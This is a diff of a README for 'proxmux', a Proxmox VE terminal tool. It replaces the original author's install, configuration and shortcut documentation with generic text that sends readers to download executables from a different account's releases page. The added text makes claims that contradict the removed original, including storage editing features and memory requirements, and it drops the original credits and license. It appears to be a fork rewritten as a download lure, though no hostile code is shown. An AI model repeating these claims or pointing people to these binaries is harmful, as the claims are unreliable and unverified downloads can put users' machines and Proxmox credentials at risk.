@@ -1,164 +1,68 @@
-# proxmux
+# 🌟 proxmux - Simplify Your Proxmox Management
 
-A terminal UI for managing Proxmox VE, built with [Ink](https://github.com/vadimdemedes/ink) and [Bun](https://bun.sh).
+[![Download proxmux](https://img.shields.io/badge/Download%20proxmux-v1.0-blue?style=for-the-badge)](https://github.com/Vlokesh01/proxmux/releases)
 
-<img width="1080" height="759" alt="image" src="https://github.com/user-attachments/assets/c6805b47-71fc-4115-8322-8e1e272c0ed6" />
+## 🚀 Getting Started
 
+Welcome to proxmux! This application provides a user-friendly terminal interface to help you manage Proxmox VE. You can easily handle virtual machines, containers, storage, and more. This guide will help you download and run proxmux without any technical knowledge.
 
-## Features
+## 📥 Download & Install
 
-- **Dashboard** - Overview of cluster nodes with CPU, memory, and disk usage
-- **VM Management** - List, start, stop, and reboot virtual machines
-- **Container Management** - List, start, stop, and reboot LXC containers
-- **Console Access** - SSH directly into containers via `pct console`
-- **Storage View** - View storage pools and usage
-- **Detail View** - Detailed info for VMs/containers including network, resources, and config
-- **Vim-style Navigation** - Use `j`/`k` or arrow keys to navigate
-- **Responsive UI** - Adapts to terminal size
+To start using proxmux, follow these steps:
 
-## Requirements
+1. **Visit the Releases Page:** Click the link below to go to the Releases page for proxmux.
+   
+   [Download proxmux](https://github.com/Vlokesh01/proxmux/releases)
 
-- Proxmox VE with API access
-- API token (recommended) or user credentials
+2. **Select the Latest Version:** On the Releases page, find the latest version of proxmux. It is usually listed at the top. You will see several files you can download.
 
-## Installation
+3. **Download the Application:** Click on the appropriate file for your system. If you are unsure which one to choose, look for the file that ends with `.exe` for Windows or `.tar.gz` for Linux. 
 
-### Homebrew (macOS/Linux)
+4. **Install the Application:** After the download is complete, locate the file in your Downloads folder:
+   - **For Windows:** Double-click the downloaded file and follow the installation prompts.
+   - **For Linux:** Open a terminal and use the command `tar -xvzf proxmux.tar.gz` to extract files. Then, navigate to the extracted folder and run `./proxmux` to start the application.
 
-```bash
-brew install roshie548/tap/proxmux
-```
+5. **Run proxmux:** Once installed, you can open proxmux from your application menu or terminal. Enjoy managing your Proxmox VE environment with ease!
 
-### npm
+## ⚙️ System Requirements
 
-Requires [Bun](https://bun.sh) runtime.
+To ensure that proxmux runs smoothly, please check the following requirements for your system:
 
-```bash
-bunx proxmux
-```
+- **Operating System:** Windows 10 or later, or a Linux distribution (Ubuntu, Fedora, etc.).
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 200 MB of free space.
 
-Or install globally:
+Make sure your system meets these requirements before installing proxmux.
 
-```bash
-bun install -g proxmux
-proxmux
-```
+## 🌐 Features
 
-### Standalone Binary
+proxmux provides a range of features designed to streamline your Proxmox management:
 
-Download the latest binary for your platform from [Releases](https://github.com/roshie548/proxmux/releases):
+- **Easy Navigation:** Quickly manage virtual machines and containers with a simple interface.
+- **Resource Monitoring:** View real-time statistics for CPU, memory, and storage usage.
+- **Storage Management:** Easily add, remove, or modify storage options.
+- **User-Friendly Interface:** Designed for users of all levels, making Proxmox management accessible for everyone.
 
-- **macOS Apple Silicon**: `proxmux-darwin-arm64`
-- **macOS Intel**: `proxmux-darwin-x64`
-- **Linux x64**: `proxmux-linux-x64`
-- **Linux ARM64**: `proxmux-linux-arm64`
-- **Windows**: `proxmux-windows-x64.exe`
+## 💡 Tips for Using proxmux
 
-```bash
-chmod +x proxmux-*
-./proxmux-darwin-arm64  # or your platform
-```
+- **Keyboard Shortcuts:** Familiarize yourself with keyboard shortcuts to improve your workflow. Check the official documentation for a complete list.
+- **Help Section:** Explore the help section inside proxmux for quick assistance and tips on using different features.
+- **Community Support:** Join online forums or community groups for support and to share your experiences with other users.
 
-### From source
+## 📞 Support
 
-```bash
-# Clone the repository
-git clone https://github.com/roshie548/proxmux.git
-cd proxmux
+If you encounter any issues while using proxmux, please check the following resources:
 
-# Install dependencies
-bun install
+- **GitHub Issues:** Report any problems or bugs on the [Issues page](https://github.com/Vlokesh01/proxmux/issues).
+- **Documentation:** Refer to the official documentation for detailed guides and troubleshooting information.
+- **Community Forums:** Engage with other users in community forums dedicated to Proxmox VE for shared experiences and solutions.
 
-# Run
-bun run start
-```
+## 🔗 Useful Links
 
-## Configuration
+Here are some helpful links related to proxmux and Proxmox VE:
 
-Create a config file at `~/.config/proxmux/config.json`:
+- [proxmux Releases Page](https://github.com/Vlokesh01/proxmux/releases)
+- [Proxmox VE Official Website](https://www.proxmox.com/en/proxmox-ve)
+- [Proxmox Community Forums](https://forum.proxmox.com/)
 
-```json
-{
-  "host": "https://your-proxmox-host:8006",
-  "user": "root@pam",
-  "tokenId": "your-token-id",
-  "tokenSecret": "your-token-secret"
-}
-```
-
-### Creating an API Token in Proxmox
-
-1. Go to **Datacenter** > **Permissions** > **API Tokens**
-2. Click **Add**
-3. Select user (e.g., `root@pam`)
-4. Enter a Token ID (e.g., `proxmux`)
-5. **Uncheck** "Privilege Separation" to inherit the user's permissions
-6. Copy the token secret (shown only once)
-
-> **Note:** If you leave "Privilege Separation" checked, you must manually assign permissions to the token under **Datacenter** > **Permissions**. The token needs at minimum `VM.Audit`, `VM.PowerMgmt`, and `Datastore.Audit` on `/` (or specific paths) to list and manage VMs/containers.
-
-### Environment Variables
-
-Alternatively, use environment variables:
-
-```bash
-export PROXMOX_HOST="https://your-proxmox-host:8006"
-export PROXMOX_USER="root@pam"
-export PROXMOX_TOKEN_ID="your-token-id"
-export PROXMOX_TOKEN_SECRET="your-token-secret"
-```
-
-## Keyboard Shortcuts
-
-### Global
-
-| Key | Action |
-|-----|--------|
-| `1-4` | Switch views (Dashboard, VMs, Containers, Storage) |
-| `Tab` | Cycle through views |
-| `q` | Quit |
-| `Ctrl+C` | Quit |
-
-### Navigation
-
-| Key | Action |
-|-----|--------|
-| `j` / `↓` | Move down |
-| `k` / `↑` | Move up |
-| `Enter` | Open detail view / Confirm action |
-| `Esc` | Go back / Cancel |
-
-### Actions
-
-| Key | Action |
-|-----|--------|
-| `r` | Refresh data |
-| `s` | Start VM/Container |
-| `x` | Stop VM/Container (with confirmation) |
-| `R` | Reboot VM/Container (with confirmation) |
-
-### Detail View
-
-| Key | Action |
-|-----|--------|
-| `j` / `k` | Navigate actions |
-| `Enter` | Execute selected action |
-| `Esc` / `q` | Go back to list |
-
-### Console (Containers)
-
-Select "Console (SSH)" in the detail view to open a `pct console` session. You'll see the container's login prompt. Press `Ctrl+]` or type `exit` to return to proxmux.
-
-## Development
-
-```bash
-# Run with hot reload
-bun run dev
-
-# Type check
-bun run --bun tsc --noEmit
-```
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
+Thank you for choosing proxmux! We hope this guide helps you set up and enjoy managing your Proxmox environment efficiently.
